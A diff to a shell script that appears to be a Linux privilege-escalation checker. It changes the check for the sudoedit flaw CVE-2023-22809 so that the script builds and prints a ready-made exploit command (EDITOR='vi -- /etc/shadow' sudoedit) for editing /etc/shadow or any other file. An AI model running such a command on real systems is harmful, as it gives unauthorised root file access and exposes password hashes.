@@ -483,7 +483,8 @@ fi
 ### CVE-2023-22809
 sudoeditrockchk=`cat cve.sudo2.txt | grep "$(echo $sver)" | grep "CVE-2023-22809" | cut -d"+" -f 1`
 if [ "$sudoeditrockchk" ]; then
-  sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /")
+  #sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /")
+  sudoeditrock=$(echo "$cmd" 2>/dev/null | grep -i "(root) NOPASSWD: sudoedit /" | sed -e "s/(root) NOPASSWD: /EDITOR='vi -- \/etc\/shadow' /g" )
   if [ "$sudoeditrock" ]; then
    #sudo_escape=$(sudoedit -s / | grep "sudoedit:")
    #sudo_escape=$("sudoedit -s /")
@@ -491,7 +492,9 @@ if [ "$sudoeditrockchk" ]; then
     echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2023-22809${RESET}"
     echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-22809${RESET}"
     echo -e "[-] current $sudover | vuln version: 1.8.0 to 1.9.12p1 inclusive"
-    #echo -e "[*] Run command: "
+    echo -e "[*] Run one of the command: "
+    echo -e "$sudoeditrock"
+    echo -e "[+] Tested editor: vi and vim, the file is /etc/shadow here but can be any file"
     echo -e "[*] Notes: /exploits/CVE-2023-22809.txt"
     #echo -e "[*] Exploit: "
     echo -e "\n"
